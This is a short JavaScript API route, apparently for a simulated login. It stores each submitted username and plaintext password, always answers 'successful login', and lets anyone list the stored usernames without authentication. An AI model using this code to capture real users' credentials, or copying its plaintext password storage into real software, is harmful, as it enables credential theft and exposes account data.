import db from "../../lib/db";
import { methodNotAllowed, apiError, apiSuccess } from "../../lib/apiHelpers";

export default async function handler(req, res) {
  if (req.method === "GET") {
    const rows = db.prepare("SELECT id, username, flow, status, timestamp, server_timestamp FROM submissions ORDER BY id DESC").all();
    return apiSuccess(res, { data: rows });
  }

  const rejected = methodNotAllowed(req, res, ["GET", "POST"]);
  if (rejected) return rejected;

  const { username, password, flow = "LOGIN", timestamp } = req.body;
  if (!username || !password || !timestamp) {
    return apiError(res, 400, "Faltan datos");
  }

  const now = new Date().toISOString();
  const status = "ok";
  const message = "Inicio de sesión simulado exitoso";

  db.prepare("INSERT INTO submissions (username, password, flow, status, timestamp, server_timestamp) VALUES (?, ?, ?, ?, ?, ?)")
    .run(username, password, flow, status, timestamp, now);

  return res.status(200).json({ status, message, timestamp: now });
}
